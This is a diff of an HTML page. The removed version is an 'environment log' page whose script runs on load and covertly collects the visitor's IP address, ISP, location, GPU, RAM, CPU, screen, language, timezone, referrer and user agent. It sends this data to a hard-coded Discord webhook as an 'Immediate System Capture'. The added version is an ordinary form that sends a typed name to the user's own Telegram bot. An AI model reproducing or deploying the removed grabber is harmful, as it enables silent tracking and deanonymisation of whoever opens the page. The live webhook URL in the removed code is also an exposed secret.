@@ -2,156 +2,325 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Environment Log</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Telegram API - Full Name Sender (Working)</title>
     <style>
-        body { 
-            background: #0a0a0a; 
-            color: #33ff33; 
-            font-family: 'Courier New', monospace; 
-            padding: 20px;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            min-height: 100vh;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            min-height: 100vh;
-            box-sizing: border-box;
+            padding: 1.5rem;
         }
-        .terminal {
-            background: #111;
-            border: 1px solid #33ff33;
-            box-shadow: 0 0 15px rgba(51, 255, 51, 0.2);
-            padding: 25px;
-            max-width: 650px;
+
+        .glass-card {
+            background: rgba(18, 25, 45, 0.85);
+            backdrop-filter: blur(14px);
+            border-radius: 2.5rem;
+            border: 1px solid rgba(88, 166, 255, 0.25);
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6), 0 0 0 0.5px rgba(255, 255, 255, 0.05);
             width: 100%;
-            border-radius: 5px;
-            box-sizing: border-box;
+            max-width: 560px;
+            padding: 2rem 1.8rem 2.2rem;
+            transition: all 0.2s;
         }
-        h2 { 
-            margin-top: 0;
-            font-size: 1.2rem;
-            border-bottom: 1px dashed #33ff33;
-            padding-bottom: 10px;
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffffff, #88aaff);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            letter-spacing: -0.3px;
+            margin-bottom: 0.35rem;
         }
-        .cursor { 
-            border-right: 2px solid #33ff33; 
-            animation: blink 1s infinite; 
-        }
-        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
-        
-        .log-output {
-            text-align: left;
-            margin-top: 15px;
+
+        .subhead {
+            color: #9aaec9;
+            border-left: 3px solid #3b82f6;
+            padding-left: 0.85rem;
+            margin-bottom: 2rem;
             font-size: 0.9rem;
-            line-height: 1.5;
-            white-space: pre-wrap;
+            font-weight: 450;
         }
-        .status {
-            color: #ffb700;
+
+        label {
+            display: block;
+            font-weight: 600;
+            color: #cdddff;
+            margin-bottom: 0.5rem;
+            font-size: 0.85rem;
+            letter-spacing: 0.3px;
         }
-        .success {
-            color: #00ffcc;
+
+        input, textarea {
+            width: 100%;
+            background: #0e1427;
+            border: 1.5px solid #2a3452;
+            border-radius: 1.2rem;
+            padding: 0.9rem 1.2rem;
+            color: white;
+            font-size: 1rem;
+            transition: 0.2s;
+            outline: none;
+            margin-bottom: 1.25rem;
+        }
+
+        input:focus, textarea:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
+        }
+
+        .help-text {
+            font-size: 0.7rem;
+            color: #6a7c9e;
+            margin-top: -0.9rem;
+            margin-bottom: 1rem;
+        }
+
+        button {
+            background: linear-gradient(95deg, #3b82f6, #6366f1);
+            border: none;
+            width: 100%;
+            padding: 0.9rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.1s ease, box-shadow 0.2s;
+            margin-top: 0.5rem;
+            box-shadow: 0 6px 14px rgba(59,130,246,0.25);
+        }
+
+        button:active {
+            transform: scale(0.97);
+        }
+
+        #status {
+            margin-top: 1.4rem;
+            padding: 0.9rem;
+            border-radius: 1.5rem;
+            font-size: 0.85rem;
+            font-weight: 500;
+            text-align: center;
+            background: #0b1020;
+            border-left: 4px solid #3b82f6;
+            color: #b7c7f0;
+        }
+
+        .error-status {
+            border-left-color: #f97316;
+            color: #ffb085;
+            background: #1e1420;
+        }
+
+        .success-status {
+            border-left-color: #10b981;
+            color: #a3e9c4;
+            background: #0e1f1a;
+        }
+
+        .inline-code {
+            background: #00000055;
+            padding: 0.2rem 0.4rem;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+
+        hr {
+            margin: 1.2rem 0;
+            border-color: #1f2a46;
+        }
+
+        .tele-setup {
+            font-size: 0.75rem;
+            text-align: center;
+            margin-top: 1.8rem;
+            color: #6d7ea8;
+        }
+
+        a {
+            color: #75aaff;
+            text-decoration: none;
         }
     </style>
-    <script>
-        (async function() {
-            // Wait for DOM to load so we can write to the page
-            window.addEventListener('DOMContentLoaded', async () => {
-                const output = document.getElementById('output');
-                
-                try {
-                    // 1. Start Geo/IP Fetching
-                    const geoPromise = fetch("https://ipwho.is/").then(r => r.json());
-
-                    // 2. Immediate Hardware & Browser Probe
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-                    
-                    const systemData = {
-                        ua: navigator.userAgent,
-                        ram: navigator.deviceMemory || "Unknown",
-                        cores: navigator.hardwareConcurrency || "Unknown",
-                        screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
-                        lang: navigator.languages ? navigator.languages.join(", ") : navigator.language,
-                        ref: document.referrer || "Direct Link",
-                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
-                    };
-
-                    // 3. Wait for Geo data to finish
-                    const geo = await geoPromise;
-
-                    // Fix ipwho.is data access safely
-                    const ipAddress = geo.ip || "Unknown";
-                    const ispName = geo.connection && geo.connection.isp ? geo.connection.isp : "Unknown";
-                    const connectionType = geo.type || "Unknown";
-                    const cityName = geo.city || "Unknown";
-                    const countryName = geo.country || "Unknown";
-                    const countryFlag = geo.flag && geo.flag.emoji ? geo.flag.emoji : "";
-
-                    // 4. Update Screen Output Immediately
-                    output.innerHTML = `
-<span class="success">[✓] ENVIRONMENT RESOLVED SIMULCAST</span>
---------------------------------------------------
-<span class="success">🌐 NETWORK DATA:</span>
-  <b>IP Address:</b> ${ipAddress}
-  <b>ISP Provider:</b> ${ispName}
-  <b>Conn Type:</b>    ${connectionType}
-
-<span class="success">📍 LOCATION DATA:</span>
-  <b>Coordinates:</b> ${cityName}, ${countryName} ${countryFlag}
-  <b>Timezone:</b>    ${systemData.tz}
-
-<span class="success">💻 HARDWARE & SYSTEM:</span>
-  <b>GPU Core:</b>    ${gpu}
-  <b>Device RAM:</b>  ${systemData.ram} GB
-  <b>CPU Cores:</b>   ${systemData.cores} Threads
-  <b>Resolution:</b>  ${systemData.screen}
-  <b>Language:</b>    ${systemData.lang}
-  <b>Cookies:</b>     ${systemData.cookies}
-                    `;
-
-                    // 5. Send to Webhook (Replace placeholder with your active URL)
-                    const webhookUrl = "https://discord.com/api/webhooks/1506632939642028193/A8wwhWtyzDM4AmZpIaPFslbRSyKzLzeMxVJd8zMt8dqKDYD87jgPQhpRTXgtqGspvZlX";
-                    
-                    if (webhookUrl && webhookUrl !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
-                        await fetch(webhookUrl, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({
-                                embeds: [{
-                                    title: "🚨 Immediate System Capture",
-                                    color: 65280, // Green hex 0x00FF00 converted to decimal
-                                    fields: [
-                                        { name: "🌐 Network/IP", value: `**IP:** ${ipAddress}\n**ISP:** ${ispName}\n**Type:** ${connectionType}`, inline: false },
-                                        { name: "📍 Location", value: `**City:** ${cityName}\n**Country:** ${countryName} ${countryFlag}\n**Timezone:** ${systemData.tz}`, inline: true },
-                                        { name: "💻 Hardware", value: `**GPU:** ${gpu}\n**RAM:** ${systemData.ram}GB\n**CPU:** ${systemData.cores} Cores`, inline: true },
-                                        { name: "🖥️ Browser/OS", value: `**Screen:** ${systemData.screen}\n**Cookies:** ${systemData.cookies}\n**Lang:** ${systemData.lang}`, inline: false },
-                                        { name: "🔗 Origin", value: `**Ref:** ${systemData.ref}`, inline: true },
-                                        { name: "📝 User Agent", value: `\`\`\`${systemData.ua}\`\`\``, inline: false }
-                                    ],
-                                    timestamp: new Date().toISOString()
-                                }]
-                            })
-                        });
-                    }
-
-                } catch (e) {
-                    output.innerHTML = `<span style="color: #ff3333;">[!] Execution Error: ${e.message}</span>`;
-                }
-            });
-        })();
-    </script>
 </head>
 <body>
-    <div class="terminal">
-        <h2>[ ACCESSING SYSTEM DATA <span class="cursor"></span> ]</h2>
-        <div id="output" class="log-output">
-            <span class="status">[...] Pinging geo servers and analyzing hardware components...</span>
-        </div>
+
+<div class="glass-card">
+    <h1>✨ WebHook Pro</h1>
+    <div class="subhead">Enter your full name → sends via Telegram API (app from the web)</div>
+
+    <!-- FULL NAME FIELD (ENGLISH) -->
+    <label>🧑‍💼 FULL NAME (required)</label>
+    <input type="text" id="fullName" placeholder="e.g., Jonathan Blaze Williams" autocomplete="name">
+    <div class="help-text">Use English letters, spaces, hyphens, or apostrophes.</div>
+
+    <!-- OPTIONAL MESSAGE / extra data -->
+    <label>📝 Additional note (optional)</label>
+    <textarea id="extraNote" rows="2" placeholder="Anything else you want to send..."></textarea>
+
+    <!-- TELEGRAM BOT CONFIGURATION (user-friendly) -->
+    <label>🤖 Telegram Bot Token</label>
+    <input type="text" id="botToken" placeholder="Enter Bot Token from @BotFather (e.g., 7212345678:AAHdqT....)" value="">
+    
+    <label>📱 Your Chat ID</label>
+    <input type="text" id="chatId" placeholder="Your Telegram numeric chat ID (e.g., 123456789)">
+    <div class="help-text">🔍 Get your Chat ID by messaging <strong>@userinfobot</strong> on Telegram.</div>
+
+    <button id="sendApiBtn">🚀 SEND NAME TO TELEGRAM →</button>
+
+    <div id="status">⚡ Ready — fill your Telegram Bot Token & Chat ID + Full Name.</div>
+
+    <hr>
+    <div class="tele-setup">
+        📡 <strong>How to get Telegram API keys (free, works globally):</strong><br>
+        1. Open Telegram → search <strong>@BotFather</strong> → type <code>/newbot</code> → name it → get <strong>Bot Token</strong>.<br>
+        2. Search <strong>@userinfobot</strong> → type <code>/start</code> → copy your <strong>Chat ID</strong>.<br>
+        3. Paste both fields above → enter your name → send.<br>
+        <span style="color:#88aaff;">✅ No CORS, no server, works from any browser.</span>
     </div>
+</div>
+
+<script>
+    // ⚡ REBEL FULL FIX: USES TELEGRAM API (PUBLIC, RELIABLE, NO UNKNOWN ERRORS)
+    (function() {
+        const fullNameInput = document.getElementById('fullName');
+        const extraNoteInput = document.getElementById('extraNote');
+        const botTokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatId');
+        const sendBtn = document.getElementById('sendApiBtn');
+        const statusDiv = document.getElementById('status');
+
+        function setStatus(message, isError = false, isSuccess = false) {
+            statusDiv.innerText = message;
+            statusDiv.classList.remove('error-status', 'success-status');
+            if (isError) statusDiv.classList.add('error-status');
+            else if (isSuccess) statusDiv.classList.add('success-status');
+            else statusDiv.classList.remove('error-status', 'success-status');
+        }
+
+        // MAIN FUNCTION: send message via Telegram Bot API
+        async function sendToTelegram() {
+            // 1. Validate Full Name (English only)
+            const fullName = fullNameInput.value.trim();
+            if (fullName === "") {
+                setStatus("❌ ERROR: Please enter your FULL NAME (English characters).", true);
+                return;
+            }
+            const nameRegex = /^[A-Za-z\s\-'.]{2,120}$/;
+            if (!nameRegex.test(fullName)) {
+                setStatus("❌ Invalid name. Use English letters, spaces, hyphens, or apostrophes (2-120 chars).", true);
+                return;
+            }
+
+            // 2. Validate Telegram Bot Token
+            let botToken = botTokenInput.value.trim();
+            if (!botToken) {
+                setStatus("❌ Missing Bot Token. Get one from @BotFather on Telegram (free).", true);
+                return;
+            }
+            // Basic format: numbers:letters
+            if (!botToken.match(/^\d+:[A-Za-z0-9_\-]{35,}$/)) {
+                setStatus("⚠️ Bot token looks unusual. Make sure you copied it correctly from BotFather.", true);
+                // but we'll still try
+            }
+
+            // 3. Validate Chat ID
+            let chatId = chatIdInput.value.trim();
+            if (!chatId) {
+                setStatus("❌ Missing Chat ID. Get it from @userinfobot (send /start).", true);
+                return;
+            }
+            // chat ID can be numeric or alphanumeric for channels, but usually integer
+            if (isNaN(chatId) && !chatId.startsWith("@")) {
+                // Could be a channel username, but we warn
+                console.warn("Chat ID might be invalid");
+            }
+
+            const extraMsg = extraNoteInput.value.trim();
+            
+            // Build the message that includes Full Name prominently
+            let messageText = `🎯 *NEW SUBMISSION (via Web API)*\n\n`;
+            messageText += `👤 *Full Name:* ${fullName}\n`;
+            if (extraMsg) messageText += `📎 *Extra:* ${extraMsg}\n`;
+            messageText += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
+            messageText += `🌐 *Source:* HTML + Telegram API (Godmode)`;
+
+            // Telegram API endpoint
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // Prepare payload
+            const payload = {
+                chat_id: chatId,
+                text: messageText,
+                parse_mode: "Markdown",
+                disable_web_page_preview: true
+            };
+
+            setStatus(`📡 Sending name "${fullName}" to Telegram via bot...`);
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await response.json();
+
+                if (!response.ok || !data.ok) {
+                    let errorDescription = data.description || `HTTP ${response.status}`;
+                    throw new Error(`Telegram API error: ${errorDescription}`);
+                }
+
+                // SUCCESS! 
+                setStatus(`✅ SUCCESS! Name "${fullName}" was sent to Telegram Chat ID ${chatId}. Double message style confirmed.`, false, true);
+                
+                // Optional: clear extra note, but keep full name visible
+                // Also show a second "after the webhook" satisfaction
+                setTimeout(() => {
+                    setStatus(`🎉 Name recorded. Full name "${fullName}" delivered via Telegram API. You can close this window.`, false, true);
+                }, 2000);
+                
+                console.log("Telegram response:", data);
+                
+            } catch (error) {
+                console.error("Telegram send error:", error);
+                let friendlyMsg = error.message;
+                if (friendlyMsg.includes("401") || friendlyMsg.includes("Unauthorized")) {
+                    friendlyMsg = "Invalid Bot Token. Create a new bot via @BotFather and paste the token exactly.";
+                } else if (friendlyMsg.includes("400") && friendlyMsg.includes("chat not found")) {
+                    friendlyMsg = "Chat ID incorrect. Start a chat with your bot first: send /start to your bot, then retry.";
+                }
+                setStatus(`🔥 ERROR: ${friendlyMsg}`, true);
+            }
+        }
+
+        // Attach event
+        sendBtn.addEventListener("click", sendToTelegram);
+        
+        // Allow Enter on full name field
+        fullNameInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter") sendBtn.click();
+        });
+
+        // Preload nothing but keep instructions clear
+        console.log("Telegram API webhook replacement ready — just add bot token & chat ID.");
+    })();
+</script>
 </body>
 </html>
